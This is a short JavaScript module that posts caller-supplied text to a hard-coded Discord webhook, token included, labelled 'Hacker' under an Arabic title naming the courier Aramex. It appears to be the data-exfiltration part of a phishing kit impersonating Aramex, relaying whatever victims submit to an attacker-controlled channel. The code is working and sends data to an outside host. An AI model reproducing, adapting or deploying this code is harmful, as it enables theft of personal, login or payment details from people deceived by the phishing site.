import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323278087592476814/utqS0SlDI2CRJf53GC0ZcB1wRgTZeFXGn54gL-Veak1KWPTasmTfEEA4XyRmCBbEgjM_",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
